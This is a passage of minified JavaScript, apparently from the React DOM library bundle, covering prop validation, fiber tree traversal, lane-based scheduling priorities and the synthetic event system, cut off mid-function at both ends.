Dc(t,e){if(e){if(uT[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(M(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(M(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(M(61))}if(e.style!=null&&typeof e.style!="object")throw Error(M(62))}}function bc(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Vc=null;function Xh(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Oc=null,pi=null,mi=null;function zp(t){if(t=vo(t)){if(typeof Oc!="function")throw Error(M(280));var e=t.stateNode;e&&(e=Ol(e),Oc(t.stateNode,t.type,e))}}function Oy(t){pi?mi?mi.push(t):mi=[t]:pi=t}function Ly(){if(pi){var t=pi,e=mi;if(mi=pi=null,zp(t),e)for(t=0;t<e.length;t++)zp(e[t])}}function My(t,e){return t(e)}function Fy(){}var Uu=!1;function Uy(t,e,n){if(Uu)return t(e,n);Uu=!0;try{return My(t,e,n)}finally{Uu=!1,(pi!==null||mi!==null)&&(Fy(),Ly())}}function $s(t,e){var n=t.stateNode;if(n===null)return null;var r=Ol(n);if(r===null)return null;n=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(M(231,e,typeof n));return n}var Lc=!1;if(vn)try{var us={};Object.defineProperty(us,"passive",{get:function(){Lc=!0}}),window.addEventListener("test",us,us),window.removeEventListener("test",us,us)}catch{Lc=!1}function cT(t,e,n,r,i,s,o,l,u){var h=Array.prototype.slice.call(arguments,3);try{e.apply(n,h)}catch(f){this.onError(f)}}var xs=!1,Wa=null,qa=!1,Mc=null,hT={onError:function(t){xs=!0,Wa=t}};function dT(t,e,n,r,i,s,o,l,u){xs=!1,Wa=null,cT.apply(hT,arguments)}function fT(t,e,n,r,i,s,o,l,u){if(dT.apply(this,arguments),xs){if(xs){var h=Wa;xs=!1,Wa=null}else throw Error(M(198));qa||(qa=!0,Mc=h)}}function zr(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function jy(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function Bp(t){if(zr(t)!==t)throw Error(M(188))}function pT(t){var e=t.alternate;if(!e){if(e=zr(t),e===null)throw Error(M(188));return e!==t?null:t}for(var n=t,r=e;;){var i=n.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return Bp(i),t;if(s===r)return Bp(i),e;s=s.sibling}throw Error(M(188))}if(n.return!==r.return)n=i,r=s;else{for(var o=!1,l=i.child;l;){if(l===n){o=!0,n=i,r=s;break}if(l===r){o=!0,r=i,n=s;break}l=l.sibling}if(!o){for(l=s.child;l;){if(l===n){o=!0,n=s,r=i;break}if(l===r){o=!0,r=s,n=i;break}l=l.sibling}if(!o)throw Error(M(189))}}if(n.alternate!==r)throw Error(M(190))}if(n.tag!==3)throw Error(M(188));return n.stateNode.current===n?t:e}function zy(t){return t=pT(t),t!==null?By(t):null}function By(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=By(t);if(e!==null)return e;t=t.sibling}return null}var $y=It.unstable_scheduleCallback,$p=It.unstable_cancelCallback,mT=It.unstable_shouldYield,gT=It.unstable_requestPaint,Re=It.unstable_now,yT=It.unstable_getCurrentPriorityLevel,Jh=It.unstable_ImmediatePriority,Wy=It.unstable_UserBlockingPriority,Ha=It.unstable_NormalPriority,vT=It.unstable_LowPriority,qy=It.unstable_IdlePriority,Nl=null,Qt=null;function _T(t){if(Qt&&typeof Qt.onCommitFiberRoot=="function")try{Qt.onCommitFiberRoot(Nl,t,void 0,(t.current.flags&128)===128)}catch{}}var zt=Math.clz32?Math.clz32:TT,wT=Math.log,ET=Math.LN2;function TT(t){return t>>>=0,t===0?32:31-(wT(t)/ET|0)|0}var ra=64,ia=4194304;function _s(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function Ga(t,e){var n=t.pendingLanes;if(n===0)return 0;var r=0,i=t.suspendedLanes,s=t.pingedLanes,o=n&268435455;if(o!==0){var l=o&~i;l!==0?r=_s(l):(s&=o,s!==0&&(r=_s(s)))}else o=n&~i,o!==0?r=_s(o):s!==0&&(r=_s(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=r;0<e;)n=31-zt(e),i=1<<n,r|=t[n],e&=~i;return r}function IT(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function ST(t,e){for(var n=t.suspendedLanes,r=t.pingedLanes,i=t.expirationTimes,s=t.pendingLanes;0<s;){var o=31-zt(s),l=1<<o,u=i[o];u===-1?(!(l&n)||l&r)&&(i[o]=IT(l,e)):u<=e&&(t.expiredLanes|=l),s&=~l}}function Fc(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Hy(){var t=ra;return ra<<=1,!(ra&4194240)&&(ra=64),t}function ju(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function go(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-zt(e),t[e]=n}function AT(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var r=t.eventTimes;for(t=t.expirationTimes;0<n;){var i=31-zt(n),s=1<<i;e[i]=0,r[i]=-1,t[i]=-1,n&=~s}}function Zh(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var r=31-zt(n),i=1<<r;i&e|t[r]&e&&(t[r]|=e),n&=~i}}var ue=0;function Gy(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var Ky,ed,Qy,Yy,Xy,Uc=!1,sa=[],Gn=null,Kn=null,Qn=null,Ws=new Map,qs=new Map,Ln=[],CT="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Wp(t,e){switch(t){case"focusin":case"focusout":Gn=null;break;case"dragenter":case"dragleave":Kn=null;break;case"mouseover":case"mouseout":Qn=null;break;case"pointerover":case"pointerout":Ws.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":qs.delete(e.pointerId)}}function cs(t,e,n,r,i,s){return t===null||t.nativeEvent!==s?(t={blockedOn:e,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=vo(e),e!==null&&ed(e)),t):(t.eventSystemFlags|=r,e=t.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),t)}function RT(t,e,n,r,i){switch(e){case"focusin":return Gn=cs(Gn,t,e,n,r,i),!0;case"dragenter":return Kn=cs(Kn,t,e,n,r,i),!0;case"mouseover":return Qn=cs(Qn,t,e,n,r,i),!0;case"pointerover":var s=i.pointerId;return Ws.set(s,cs(Ws.get(s)||null,t,e,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,qs.set(s,cs(qs.get(s)||null,t,e,n,r,i)),!0}return!1}function Jy(t){var e=Er(t.target);if(e!==null){var n=zr(e);if(n!==null){if(e=n.tag,e===13){if(e=jy(n),e!==null){t.blockedOn=e,Xy(t.priority,function(){Qy(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Sa(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=jc(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var r=new n.constructor(n.type,n);Vc=r,n.target.dispatchEvent(r),Vc=null}else return e=vo(n),e!==null&&ed(e),t.blockedOn=n,!1;e.shift()}return!0}function qp(t,e,n){Sa(t)&&n.delete(e)}function xT(){Uc=!1,Gn!==null&&Sa(Gn)&&(Gn=null),Kn!==null&&Sa(Kn)&&(Kn=null),Qn!==null&&Sa(Qn)&&(Qn=null),Ws.forEach(qp),qs.forEach(qp)}function hs(t,e){t.blockedOn===e&&(t.blockedOn=null,Uc||(Uc=!0,It.unstable_scheduleCallback(It.unstable_NormalPriority,xT)))}function Hs(t){function e(i){return hs(i,t)}if(0<sa.length){hs(sa[0],t);for(var n=1;n<sa.length;n++){var r=sa[n];r.blockedOn===t&&(r.blockedOn=null)}}for(Gn!==null&&hs(Gn,t),Kn!==null&&hs(Kn,t),Qn!==null&&hs(Qn,t),Ws.forEach(e),qs.forEach(e),n=0;n<Ln.length;n++)r=Ln[n],r.blockedOn===t&&(r.blockedOn=null);for(;0<Ln.length&&(n=Ln[0],n.blockedOn===null);)Jy(n),n.blockedOn===null&&Ln.shift()}var gi=Rn.ReactCurrentBatchConfig,Ka=!0;function kT(t,e,n,r){var i=ue,s=gi.transition;gi.transition=null;try{ue=1,td(t,e,n,r)}finally{ue=i,gi.transition=s}}function PT(t,e,n,r){var i=ue,s=gi.transition;gi.transition=null;try{ue=4,td(t,e,n,r)}finally{ue=i,gi.transition=s}}function td(t,e,n,r){if(Ka){var i=jc(t,e,n,r);if(i===null)Yu(t,e,r,Qa,n),Wp(t,r);else if(RT(i,t,e,n,r))r.stopPropagation();else if(Wp(t,r),e&4&&-1<CT.indexOf(t)){for(;i!==null;){var s=vo(i);if(s!==null&&Ky(s),s=jc(t,e,n,r),s===null&&Yu(t,e,r,Qa,n),s===i)break;i=s}i!==null&&r.stopPropagation()}else Yu(t,e,r,null,n)}}var Qa=null;function jc(t,e,n,r){if(Qa=null,t=Xh(r),t=Er(t),t!==null)if(e=zr(t),e===null)t=null;else if(n=e.tag,n===13){if(t=jy(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return Qa=t,null}function Zy(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(yT()){case Jh:return 1;case Wy:return 4;case Ha:case vT:return 16;case qy:return 536870912;default:return 16}default:return 16}}var Bn=null,nd=null,Aa=null;function ev(){if(Aa)return Aa;var t,e=nd,n=e.length,r,i="value"in Bn?Bn.value:Bn.textContent,s=i.length;for(t=0;t<n&&e[t]===i[t];t++);var o=n-t;for(r=1;r<=o&&e[n-r]===i[s-r];r++);return Aa=i.slice(t,1<r?1-r:void 0)}function Ca(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function oa(){return!0}function Hp(){return!1}function At(t){function e(n,r,i,s,o){this._reactName=n,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var l in t)t.hasOwnProperty(l)&&(n=t[l],this[l]=n?n(s):s[l]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?oa:Hp,this.isPropagationStopped=Hp,this}return Te(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=oa)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=oa)},persist:function(){},isPersistent:oa}),e}var ji={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},rd=At(ji),yo=Te({},ji,{view:0,detail:0}),NT=At(yo),zu,Bu,ds,Dl=Te({},yo,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:id,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==ds&&(ds&&t.type==="mousemove"?(zu=t.screenX-ds.screenX,Bu=t.screenY-ds.screenY):Bu=zu=0,ds=t),zu)},movementY:function(t){return"movementY"in t?t.movementY:Bu}}),Gp=At(Dl),DT=Te({},Dl,{dataTransfer:0}),bT=At(DT),VT=Te({},yo,{relatedTarget:0}),$u=At(VT),OT=Te({},ji,{animationName:0,elapsedTime:0,pseudoElement:0}),LT=At(OT),MT=Te({},ji,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),FT=At(MT),UT=Te({},ji,{data:0}),Kp=At(UT),jT={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},zT={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},BT={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function $T(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=BT[t])?!!e[t]:!1}function id(){return $T}var WT=Te({},yo,{key:function(t){if(t.key){var e=jT[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Ca(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?zT[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:id,charCode:function(t){return t.type==="keypress"?Ca(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Ca(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),qT=At(WT),HT=Te({},Dl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Qp=At(HT),GT=Te({},yo,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:id}),KT=At(GT),QT=Te({},ji,{propertyName:0,elapsedTime:0,pseudoElement:0}),YT=At(QT),XT=Te({},Dl,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),JT=At(XT),ZT=[9,13,27,32],sd=vn&&"CompositionEvent"in window,ks=null;vn&&"documentMode"in document&&(ks=document.documentMode);var eI=vn&&"TextEvent"in window&&!ks,tv=vn&&(!sd||ks&&8<ks&&11>=ks),Yp=" ",Xp=!1;function nv(t,e){switch(t){case"keyup":return ZT.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function rv(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var ni=!1;function tI(t,e){switch(t){case"compositionend":return rv(e);case"keypress":return e.which!==32?null:(Xp=!0,Yp);case"textInput":return t=e.data,t===Yp&&Xp?null:t;default:return null}}function nI(t,e){if(ni)return t==="compositionend"||!sd&&nv(t,e)?(t=ev(),Aa=nd=Bn=null,ni=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return tv&&e.locale!=="ko"?null:e.data;default:return null}}var rI={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Jp(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!rI[t.type]:e==="textarea"}function iv(t,e,n,r){Oy(r),e=Ya(e,"onChange"),0<e.length&&(n=new rd("onChange","change",null,n,r),t.push({event:n,listeners:e}))}var Ps=null,Gs=null;function iI(t){mv(t,0)}function bl(t){var e=si(t);if(xy(e))return t}function sI(t,e){if(t==="change")return e}var sv=!1;if(vn){var Wu;if(vn){var qu="oninput"in document;if(!qu){var Zp=document.createElement("div");Zp.setAttribute("oninput","return;"),qu=typeof Zp.oninput=="function"}Wu=qu}else Wu=!1;sv=Wu&&(!document.documentMode||9<document.documentMode)}function em(){Ps&&(Ps.detachEvent("onpropertychange",ov),Gs=Ps=null)}function ov(t){if(t.propertyName==="value"&&bl(Gs)){var e=[];iv(e,Gs,t,Xh(t)),Uy(iI,e)}}function oI(t,e,n){t==="focusin"?(em(),Ps=e,Gs=n,Ps.attachEvent("onpropertychange",ov)):t==="focusout"&&em()}function aI(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return bl(Gs)}function lI(t,e){if(t==="click")return bl(e)}function uI(t,e){if(t==="input"||t==="change")return bl(e)}function cI(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var $t=typeof Object.is=="function"?Object.is:cI;function Ks(t,e){if($t(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),r=Object.keys(e);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Tc.call(e,i)||!$t(t[i],e[i]))return!1}return!0}function tm(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function nm(t,e){var n=tm(t);t=0;for(var r;n;){if(n.nodeType===3){if(r=t+n.textContent.length,t<=e&&r>=e)return{node:n,offset:e-t};t=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=tm(n)}}function av(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?av(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function lv(){for(var t=window,e=$a();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=$a(t.document)}return e}function od(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function hI(t){var e=lv(),n=t.focusedElem,r=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&av(n.ownerDocument.documentElement,n)){if(r!==null&&od(n)){if(e=r.start,t=r.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!t.extend&&s>r&&(i=r,r=s,s=i),i=nm(n,s);var o=nm(n,r);i&&o&&(t.rangeCount!==1||t.anchorNode!==i.node||t.anchorOffset!==i.offset||t.focusNode!==o.node||t.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),t.removeAllRanges(),s>r?(t.addRange(e),t.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var dI=vn&&"documentMode"in document&&11>=document.documentMode,ri=null,zc=null,Ns=null,Bc=!1;function rm(t,e,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Bc||ri==null||ri!==$a(r)||(r=ri,"selectionStart"in r&&od(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Ns&&Ks(Ns,r)||(Ns=r,r=Ya(zc,"onSelect"),0<r.length&&(e=new rd("onSelect","select",null,e,n),t.push({event:e,listeners:r}),e.target=ri)))}function aa(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var ii={animationend:aa("Animation","AnimationEnd"),animationiteration:aa("Animation","AnimationIteration"),animationstart:aa("Animation","AnimationStart"),transitionend:aa("Transition","TransitionEnd")},Hu={},uv={};vn&&(uv=document.createElement("div").style,"AnimationEvent"in window||(delete ii.animationend.animation,delete ii.animationiteration.animation,delete ii.animationstart.animation),"TransitionEvent"in window||delete ii.transitionend.transition);function Vl(t){if(Hu[t])return Hu[t];if(!ii[t])return t;var e=ii[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in uv)return Hu[t]=e[n];return t}var cv=Vl("animationend"),hv=Vl("animationiteration"),dv=Vl("animationstart"),fv=Vl("transitionend"),pv=new Map,im="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function cr(t,e){pv.set(t,e),jr(e,[t])}for(var Gu=0;Gu<im.length;Gu++){var Ku=im[Gu],fI=Ku.toLowerCase(),pI=Ku[0].toUpperCase()+Ku.slice(1);cr(fI,"on"+pI)}cr(cv,"onAnimationEnd");cr(hv,"onAnimationIteration");cr(dv,"onAnimationStart");cr("dblclick","onDoubleClick");cr("focusin","onFocus");cr("focusout","onBlur");cr(fv,"onTransitionEnd");Ii("onMouseEnter",["mouseout","mouseover"]);Ii("onMouseLeave",["mouseout","mouseover"]);Ii("onPointerEnter",["pointerout","pointerover"]);Ii("onPointerLeave",["pointerout","pointerover"]);jr("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));jr("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));jr("onBeforeInput",["compositionend","keypress","textInput","paste"]);jr("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));jr("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));jr("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var ws="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),mI=new Set("cancel close invalid load scroll toggle".split(" ").concat(ws));function sm(t,e,n){var r=t.type||"unknown-event";t.currentTarget=n,fT(r,e,void 0,t),t.currentTarget=null}function mv(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var r=t[n],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var l=r[o],u=l.instance,h=l.currentTarget;if(l=l.listener,u!==s&&i.isPropagationStopped())break e;sm(i,l,h),s=u}else for(o=0;o<r.length;o++){if(l=r[o],u=l.instance,h=l.currentTarget,l=l.listener,u!==s&&i.isPropagationStopped())break e;sm(i,l,h),s=u}}}if(qa)throw t=Mc,qa=!1,Mc=null,t}function ge(t,e){var n=e[Gc];n===void 0&&(n=e[Gc]=new Set);var r=t+"__bubble";n.has(r)||(gv(e,t,2,!1),n.add(r))}function Qu(t,e,n){var r=0;e&&(r|=4),gv(n,t,r,e)}var la="_reactListening"+Math.random().toString(36).slice(2);function Qs(t){if(!t[la]){t[la]=!0,Iy.forEach(function(n){n!=="selectionchange"&&(mI.has(n)||Qu(n,!1,t),Qu(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[la]||(e[la]=!0,Qu("selectionchange",!1,e))}}function gv(t,e,n,r){switch(Zy(e)){case 1:var i=kT;break;case 4:i=PT;break;default:i=td}n=i.bind(null,e,n,t),i=void 0,!Lc||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?t.addEventListener(e,n,{capture:!0,passive:i}):t.addEventListener(e,n,!0):i!==void 0?t.addEventListener(e,n,{passive:i}):t.addEventListener(e,n,!1)}function Yu(t,e,n,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var l=r.stateNode.containerInfo;if(l===i||l.nodeType===8&&l.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var u=o.tag;if((u===3||u===4)&&(u=o.stateNode.containerInfo,u===i||u.nodeType===8&&u.parentNode===i))return;o=o.return}for(;l!==null;){if(o=Er(l),o===null)return;if(u=o.tag,u===5||u===6){r=s=o;continue e}l=l.parentNode}}r=r.return}Uy(function(){var h=s,f=Xh(n),p=[];e:{var g=pv.get(t);if(g!==void 0){var v=rd,A=t;switch(t){case"keypress":if(Ca(n)===0)break e;case"keydown":case"keyup":v=qT;break;case"focusin":A="focus",v=$u;break;case"focusout":A="blur",v=$u;break;case"beforeblur":case"afterblur":v=$u;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Gp;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=bT;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=KT;break;case cv:case hv:case dv:v=LT;break;case fv:v=YT;break;case"scroll":v=NT;break;case"wheel":v=JT;break;case"copy":case"cut":case"paste":v=FT;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Qp}var k=(e&4)!==0,N=!k&&t==="scroll",S=k?g!==null?g+"Capture":null:g;k=[];for(var _=h,R;_!==null;){R=_;var V=R.stateNode;if(R.tag===5&&V!==null&&(R=V,S!==null&&(V=$s(_,S),V!=null&&k.push(Ys(_,V,R)))),N)break;_=_.return}0<k.length&&(g=new v(g,A,null,n,f),p.push({event:g,listeners:k}))}}if(!(e&7)){e:{if(g=t==="mouseover"||t==="pointerover",v=t==="mouseout"||t==="pointerout",g&&n!==Vc&&(A=n.relatedTarget||n.fromElement)&&(Er(A)||A[_n]))break 